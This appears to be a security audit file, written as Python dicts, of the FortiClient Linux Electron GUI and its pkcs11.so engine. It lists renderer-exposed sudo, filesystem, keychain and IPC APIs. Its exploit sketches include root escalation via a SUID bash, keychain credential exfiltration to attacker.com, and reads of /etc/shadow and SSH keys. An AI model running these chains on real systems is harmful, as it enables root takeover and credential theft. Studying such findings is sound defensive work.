"""
FortiClient Linux GUI (gui/FortiClient + gui/resources/app.asar) RE
Source: forticlient-standalone-deb/opt/forticlient/gui/
Framework: Electron 28.0.0 (Chromium-based); app version 7.2.0
Method: asar extraction + package.json + preload script analysis + main.js pattern scan
"""

# ---------------------------------------------------------
# GUI architecture
# ---------------------------------------------------------
GUI_ARCH = {
    "id":       "GUI-ARCH",
    "product":  "FortiClient Linux GUI -- Electron 28.0.0 app (gui/FortiClient binary + gui/resources/app.asar)",

    "binary":   {
        "path":     "/opt/forticlient/gui/FortiClient",
        "size":     "177MB ELF64 PIE NOT stripped",
        "type":     "Chromium/Electron runtime; internal symbols are V8/Blink internals, not app logic",
        "note":     "App logic is entirely in the 44MB app.asar, not the binary",
    },

    "asar": {
        "path":     "/opt/forticlient/gui/resources/app.asar",
        "size":     "44MB",
        "version":  "FortiClient 7.2.0",
        "main":     "assets/js/main.js (1MB webpack bundle = Electron main process)",
        "renderer": "assets/js/bundle.min.js (3.7MB webpack bundle = main window renderer)",
        "smallfct": "assets/js/smallfct_bundle.min.js (491KB = small FortiClient tray popup renderer)",
        "vulnotif": "assets/js/vulnotif_bundle.min.js (557KB = vulnerability notification renderer)",
    },

    "electron_security_config": {
        "nodeIntegration":  "FALSE on ALL BrowserWindows (unlike FortiFone which had true)",
        "contextIsolation": "TRUE on all windows",
        "sandbox":          "FALSE on main window (Chromium sandbox disabled)",
        "preload":          "preload/main/preload.js (5214 bytes) for main window",
        "note": (
            "contextIsolation: true + nodeIntegration: false looks secure at the window level, "
            "but the preload script (preload/main/preload.js) exposes an unvalidated IPC relay "
            "and direct filesystem + keychain + sudo APIs to the renderer. "
            "The contextBridge provides zero isolation when the relay has no allowlist. "
            "Effective security model is identical to nodeIntegration: true."
        ),
    },

    "dependencies": {
        "keytar":        "7.9.0 -- OS keychain read/write/delete",
        "sudo-prompt":   "9.2.1 -- root command execution via pkexec/kdesudo",
        "ws":            "8.18.0 -- WebSocket client for daemon IPC",
        "xml2js":        "0.6.2 -- XML parsing for VPN/SAML config",
        "axios":         "1.7.7 -- HTTP client for EMS communication",
        "electron-store": "8.1.0 -- persistent app storage",
    },

    "backend_ipc": {
        "port_file":    "/var/run/forticlient/service_port",
        "endpoint":     "http://127.0.0.1:<port from service_port file>",
        "protocol":     "WebSocket + HTTP to local CivetWeb daemon (same as FORTITRAY-F05)",
        "renderer_read": "window.fs.readFileSync('/var/run/forticlient/service_port', 'utf-8')",
        "note": "Port file read directly by renderer via exposed fs API; controls which backend the GUI talks to",
    },

    "preload_exposed_apis": [
        "window.ipc.send(channel, data)           -- unvalidated, reaches any ipcMain.on handler",
        "window.ipc.invoke(channel, ...args)       -- unvalidated, reaches any ipcMain.handle handler",
        "window.api.sudoer(command, options)       -- root command execution via sudo-prompt",
        "window.api.openExternal(url)              -- no URL validation",
        "window.keytar.getPassword(key, login)     -- OS keychain read",
        "window.keytar.setPassword(key, login, v)  -- OS keychain write",
        "window.keytar.deletePassword(key, login)  -- OS keychain delete",
        "window.fs.readFileSync(path, encoding)    -- arbitrary file read",
        "window.fsp.writeFile(path, content)       -- arbitrary file write",
        "window.net.createConnection(opts)         -- raw TCP socket creation",
        "window.forticlient.elevateGUI()           -- triggers privilege elevation flow",
        "window.forticlient.xml2JSON(xml)          -- xml2js XML parsing in main process",
        "window.process.geteuid()                  -- check current UID",
    ],
}


# ---------------------------------------------------------
# GUI-F01: api.sudoer -- root command execution exposed to all renderers
# ---------------------------------------------------------
GUI_F01_SUDO_EXEC = {
    "id":       "GUI-F01",
    "product":  "FortiClient Linux GUI -- api.sudoer(command) exposed via contextBridge; runs arbitrary commands as root",
    "severity": "CRITICAL -- renderer XSS or compromised EMS data -> root code execution on endpoint",
    "class":    "Insecure privilege escalation API exposed to untrusted renderer (CWE-250, CWE-284)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('api', { sudoer: (command, options) => ipcRenderer.invoke('api.sudoCommand', command, options) })",
        "main.js: d.handle('api.sudoCommand', function(t,n,r){ return O.exec(n,r) })",
        "O = sudo-prompt module; O.exec(command, options) invokes pkexec on Linux",
        "sudo-prompt Linux path (main.js line ~688064): /bin/bash -c 'echo SUDOPROMPT; <command>' passed to pkexec",
        "pkexec fallback: tries /usr/bin/kdesudo, then /usr/bin/pkexec",
    ],

    "exploit_chain": (
        "Step 1: Achieve renderer code execution (see GUI-F06 for no-XSS path; "
        "         or find XSS in renderer that processes EMS/FortiGate-controlled data). "
        "Step 2: Call window.api.sudoer('chmod +s /bin/bash', {name: 'FortiClient Update'}). "
        "         A polkit/pkexec dialog appears with the attacker-chosen name. "
        "Step 3: User clicks OK (or attacker waits for silent execution if polkit auto-approves). "
        "Step 4: /bin/bash is now SUID; attacker calls bash -p for permanent root. "
        "Alternative (no dialog): combine with fsp.writeFile to stage a payload, then api.sudoer executes it."
    ),

    "exploit_sketch": """
// From any renderer window (main, smallfct, vulnotif) after XSS:
window.fsp.writeFile('/tmp/.fct_payload', 'cp /bin/bash /tmp/.bash; chmod +s /tmp/.bash')
  .then(() => window.api.sudoer('/bin/bash /tmp/.fct_payload', {name: 'FortiClient Update'}))
  .then(() => { /* /tmp/.bash -p gives root shell */ });
    """,

    "see_also": [
        "GUI-F02: IPC channel relay allows ipc.invoke('api.sudoCommand', ...) directly",
        "GUI-F06: service_port injection enables renderer content injection without prior XSS",
        "FORTITRAY-F03: pkexec invocation in fortitray daemon (same CVE-2021-4034 surface)",
    ],
}


# ---------------------------------------------------------
# GUI-F02: Unvalidated IPC channel relay in preload
# ---------------------------------------------------------
GUI_F02_IPC_RELAY = {
    "id":       "GUI-F02",
    "product":  "FortiClient Linux GUI -- preload exposes ipc.send/invoke with no channel allowlist; renderer reaches any ipcMain handler",
    "severity": "CRITICAL -- contextBridge bypass; renderer triggers UNLOCK_FORTICLIENT -> pkexec, or any other privileged handler",
    "class":    "Broken access control in IPC relay (CWE-284, CWE-749)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('ipc', { send: (channel, data) => ipcRenderer.send(channel, data), invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args) })",
        "No channel allowlist anywhere in the preload",
        "main.js: d.on('UNLOCK_FORTICLIENT', function(e){ ... pkexec V ... }) where V='/opt/forticlient/unlock-gui.sh'",
        "main.js: d.handle('keytar.getPassword', ...) -- keychain read accessible via ipc.invoke",
        "main.js: d.handle('api.sudoCommand', ...) -- same as GUI-F01 but via raw ipc.invoke",
    ],

    "reachable_ipc_handlers": {
        "UNLOCK_FORTICLIENT":       "ipc.send -> pkexec /opt/forticlient/unlock-gui.sh (runs as root)",
        "api.sudoCommand":          "ipc.invoke -> sudo-prompt.exec(command) (root exec, same as GUI-F01)",
        "keytar.getPassword":       "ipc.invoke -> OS keychain read (credential extraction)",
        "keytar.setPassword":       "ipc.invoke -> OS keychain write (credential poisoning)",
        "keytar.deletePassword":    "ipc.invoke -> OS keychain delete (credential destruction)",
        "forticlient.elevateGUI":   "ipc.invoke -> elevateGUI (privilege elevation flow)",
        "forticlient.xml2JSON":     "ipc.invoke -> xml2js.parseString(attacker XML)",
    },

    "exploit_sketch": """
// Direct pkexec trigger from renderer (unlock-gui.sh is empty, runs as root via pkexec):
window.ipc.send('UNLOCK_FORTICLIENT', {});

// Credential extraction:
window.ipc.invoke('keytar.getPassword', 'FortiClient', 'vpn_user')
  .then(creds => fetch('http://attacker.com/steal?c=' + encodeURIComponent(JSON.stringify(creds))));
    """,
}


# ---------------------------------------------------------
# GUI-F03: fsp.writeFile + fs.readFileSync exposed to renderer
# ---------------------------------------------------------
GUI_F03_FS_ACCESS = {
    "id":       "GUI-F03",
    "product":  "FortiClient Linux GUI -- fsp.writeFile and fs.readFileSync exposed to renderer via contextBridge",
    "severity": "CRITICAL when chained with GUI-F01/F02; HIGH standalone (arbitrary file read/write as FortiClient user)",
    "class":    "Overly broad filesystem API exposure (CWE-552, CWE-284)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('fs', { readFileSync: fs.readFileSync, existsSync: fs.existsSync, ... })",
        "preload/main/preload.js: contextBridge.exposeInMainWorld('fsp', { writeFile: fsp.writeFile, readFile: fsp.readFile, ... })",
    ],

    "impact": {
        "read":  "window.fs.readFileSync('/etc/shadow', 'utf-8') -- reads any file readable by the forticlient process",
        "write": "window.fsp.writeFile('/home/user/.bashrc', 'malicious content') -- writes as forticlient user",
        "chain": "Write /tmp/payload.sh then window.api.sudoer('/bin/bash /tmp/payload.sh') = root exec",
        "cred_read": "window.fs.readFileSync('/home/user/.ssh/id_rsa', 'utf-8') -- read SSH private keys",
    },

    "service_port_attack": (
        "The renderer reads /var/run/forticlient/service_port via window.fs.readFileSync. "
        "If the renderer can write this file (see GUI-F06), it redirects its own backend connection. "
        "This creates a self-referential injection path without any external attacker involvement."
    ),
}


# ---------------------------------------------------------
# GUI-F04: api.openExternal with no URL validation
# ---------------------------------------------------------
GUI_F04_OPEN_EXTERNAL = {
    "id":       "GUI-F04",
    "product":  "FortiClient Linux GUI -- api.openExternal(url) with no allowlist; ZTNA server controls URL at line 279750",
    "severity": "HIGH -- protocol handler abuse; ZTNA path enables server-controlled arbitrary URL open",
    "class":    "Unvalidated URL in shell.openExternal (CWE-601)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('api', { openExternal: url => ipcRenderer.invoke('api.openExternal', url) })",
        "main.js: d.handle('api.openExternal', function(e,t){ t && h.openExternal(t) })",
        "main.js line ~279750: h.openExternal(''.concat(e.server, '/public/ztna/error?id=').concat(n)) -- server comes from ZTNA config",
        "No URL validation, no protocol allowlist in any handler",
    ],

    "attack_vectors": {
        "ms-installer":     "window.api.openExternal('ms-appinstaller://...'): Windows MSIX code execution (FortiFone cross-platform)",
        "file_protocol":    "window.api.openExternal('file:///etc/passwd'): opens local files in browser",
        "custom_protocol":  "window.api.openExternal('ssh://attacker.com'): opens SSH client with attacker host",
        "ztna_server":      "Compromised FortiGate sets ZTNA server URL; GUI opens arbitrary URL with no validation",
    },
}


# ---------------------------------------------------------
# GUI-F05: keytar credential access exposed to renderer
# ---------------------------------------------------------
GUI_F05_KEYTAR = {
    "id":       "GUI-F05",
    "product":  "FortiClient Linux GUI -- keytar 7.9.0 OS keychain exposed to renderer (read/write/delete)",
    "severity": "HIGH -- any renderer XSS extracts all FortiClient OS keychain credentials",
    "class":    "Sensitive credential exposure via renderer API (CWE-522, CWE-284)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('keytar', { getPassword, setPassword, deletePassword })",
        "keytar 7.9.0 reads from Linux Secret Service (libsecret), macOS Keychain, Windows Credential Manager",
        "FortiClient stores VPN credentials, EMS tokens, and certificate passwords via keytar",
    ],

    "exploit_sketch": """
// From renderer XSS -- enumerate all FortiClient keychain entries:
const services = ['FortiClient', 'forticlient', 'fortivpn', 'ems'];
Promise.all(services.map(s =>
  window.ipc.invoke('keytar.findCredentials', s)
)).then(results => {
  const creds = results.flat();
  window.api.openExternal('http://attacker.com/steal?d=' + btoa(JSON.stringify(creds)));
});
    """,
}


# ---------------------------------------------------------
# GUI-F06: service_port file injection -- backend redirect enables renderer data injection
# ---------------------------------------------------------
GUI_F06_SERVICE_PORT = {
    "id":       "GUI-F06",
    "product":  "FortiClient Linux GUI -- reads /var/run/forticlient/service_port from renderer; local attacker redirects GUI to malicious backend",
    "severity": "HIGH -- local file write to service_port redirects GUI to attacker server; attacker controls renderer content",
    "class":    "Insecure runtime configuration file (CWE-426, CWE-610)",

    "evidence": [
        "bundle.min.js: this.port = window.fs.readFileSync('/var/run/forticlient/service_port', 'utf-8').trim()",
        "GUI connects to http://127.0.0.1:<port> for all backend IPC",
        "/var/run/forticlient/ directory permissions: check if world-writable (inherits from FORTITRAY-F04 NNG socket dir)",
    ],

    "mechanism": (
        "The renderer reads /var/run/forticlient/service_port to discover which local port "
        "the CivetWeb daemon (FORTITRAY-F05) is listening on. "
        "If a local unprivileged attacker can write this file: "
        "  1. Replace service_port content with their own listener port (e.g., 12345). "
        "  2. GUI renderer reads the file, connects to http://127.0.0.1:12345. "
        "  3. Attacker's server returns JSON with malicious data. "
        "  4. If any renderer path renders this data as HTML without sanitization: XSS. "
        "  5. XSS calls window.api.sudoer(cmd) for root exec (GUI-F01). "
        "Combined with FORTITRAY-F04 (world-accessible NNG sockets in /var/run/forticlient/): "
        "the entire /var/run/forticlient/ directory may be attacker-writable."
    ),

    "no_xss_needed": (
        "The service_port redirect does NOT require prior XSS. "
        "A local unprivileged user writes service_port; the GUI NEXT TIME IT LOADS "
        "connects to the malicious server and receives attacker-controlled backend responses. "
        "The attack is persistence-capable: attacker's process replaces service_port on startup."
    ),

    "see_also": [
        "FORTITRAY-F04: NNG sockets in /var/run/forticlient/; directory may be world-writable",
        "FORTITRAY-F05: CivetWeb instance; legitimate service uses this port",
        "GUI-F01: api.sudoer -- root exec after renderer compromise",
    ],
}


# ---------------------------------------------------------
# GUI-F07: net.createConnection exposed to renderer
# ---------------------------------------------------------
GUI_F07_NET_SOCKET = {
    "id":       "GUI-F07",
    "product":  "FortiClient Linux GUI -- net.createConnection exposed to renderer; renderer makes raw TCP connections",
    "severity": "MEDIUM -- renderer can connect to local NNG IPC sockets; combined with FORTITRAY-F02 enables IPC injection",
    "class":    "Excessive network API exposure to renderer (CWE-284)",

    "evidence": [
        "preload/main/preload.js: contextBridge.exposeInMainWorld('net', { createConnection: net.createConnection, isIPv6: (ip) => net.isIPv6(ip) })",
    ],

    "attack_surface": (
        "The renderer can call window.net.createConnection() to connect to any local TCP socket. "
        "This includes the NNG IPC sockets for fortitray, fortivpn, confighandler, etc. "
        "If the NNG IPC protocol is replicable from JavaScript (binary framing), "
        "the renderer can inject IPC messages to trigger FORTITRAY-F02 (fabricagent:// shell injection). "
        "Proof-of-concept requires NNG message format reverse engineering."
    ),
}


# ---------------------------------------------------------
# Tpm2 pkcs11.so analysis
# ---------------------------------------------------------
TPM2_PKCS11_ARCH = {
    "id":       "TPM2-PKCS11-ARCH",
    "product":  "tpm2/lib/pkcs11.so -- libp11 OpenSSL PKCS#11 engine bridge (5.9MB, NOT stripped, debug_info)",

    "classification": (
        "This is NOT the tpm2-pkcs11 library (as the path suggests). "
        "It is the libp11 OpenSSL PKCS#11 ENGINE -- an OpenSSL provider that bridges OpenSSL "
        "to any PKCS#11 module loaded at runtime via dlopen(). "
        "Built against OpenSSL 3.5.5 (from /home/devops/code/.build/amd64/deb/src/openssl/openssl-3.5.5/). "
        "Fortinet maintains a custom OpenSSL 3.5.5 build (both legacy.so and pkcs11.so share this build tree)."
    ),

    "exported_symbol":  "NONE exported (internal functions only); loaded as ENGINE not provider",
    "dynamic_module":   "dlopen() at runtime; path set by PKCS11_MODULE_PATH env var or engine init string",
    "dependencies":     ["libdl.so.2", "libpthread.so.0", "libc.so.6"],

    "algorithms": {
        "standard":         ["AES", "RSA", "ECDH", "SHA", "X25519", "X448", "ED25519", "ED448"],
        "post_quantum":     ["ML-DSA-44 (MLDSA44)", "ML-DSA-65 (MLDSA65)", "ML-DSA-87 (MLDSA87)"],
        "chinese_state":    ["SM2 (OSCCA EC)", "SM3 (OSCCA hash)", "SM4-GCM/CCM/ECB/CTR (OSCCA block cipher)"],
        "note": (
            "SM2/SM3/SM4 are Chinese state-standardized algorithms (OSCCA/GM/T standards). "
            "Their inclusion in the global Fortinet Linux client suggests a single unified build "
            "shipping Chinese regulatory compliance algorithms to all customers. "
            "SM2/SM3/SM4 are NOT part of standard PKCS#11 or TLS cipher suites for Western deployments."
        ),
    },

    "fapi_profiles": [
        "P_ECCP256SHA256.json",
        "P_ECCP384SHA384.json",
        "P_RSA2048SHA256.json",
        "P_RSA3072SHA384.json",
    ],
}


# ---------------------------------------------------------
# TPM2-F01: PKCS11_MODULE_PATH injection via pkcs11.so dlopen
# ---------------------------------------------------------
TPM2_F01_PKCS11_DLOPEN = {
    "id":       "TPM2-F01",
    "product":  "tpm2/lib/pkcs11.so -- libp11 engine dlopen()s the module at PKCS11_MODULE_PATH; EMS-controlled path loads arbitrary .so",
    "severity": "HIGH -- connects CONFIGHANDLER-F01 (pkcs11_lib EMS injection) to actual runtime loading mechanism",
    "class":    "Insecure dynamic library loading from controllable path (CWE-114, CWE-427)",

    "evidence": [
        "nm -D output: U dlopen@GLIBC_2.2.5 (imports dlopen)",
        "strings: 'Unable to load module %s' (error when dlopen fails)",
        "strings: 'PKCS11_MODULE_PATH' (env var override for module path)",
        "strings: 'Specifies the path to the PKCS#11 module shared library'",
    ],

    "mechanism": (
        "certd loads tpm2/lib/pkcs11.so as an OpenSSL ENGINE. "
        "The engine then dlopen()'s whatever module path is specified in PKCS11_MODULE_PATH "
        "or in the ENGINE init string (passed by certd at load time). "
        "CONFIGHANDLER-F01 shows the pkcs11_lib path is controlled by EMS configuration. "
        "Attack chain: "
        "  1. Compromised EMS pushes pkcs11_lib = '/tmp/evil.so'. "
        "  2. certd passes this path as the ENGINE init string to tpm2/lib/pkcs11.so. "
        "  3. pkcs11.so calls dlopen('/tmp/evil.so'). "
        "  4. evil.so is loaded into certd's address space with certd privileges. "
        "  5. evil.so's constructor runs arbitrary code in certd context. "
        "Fleet impact: all EMS-managed endpoints load the malicious library simultaneously."
    ),

    "see_also": [
        "CONFIGHANDLER-F01: EMS can set pkcs11_lib path via confighandler IPC",
        "CERTD-F01: certd software TPM fallback; certd runs as root or with CAP_SYS_ADMIN",
        "EMS-CHAIN-A: combines CONFIGHANDLER-F01 + EPCTRL-F01/F03 + UPDATE-F01 for full fleet root exec",
    ],
}
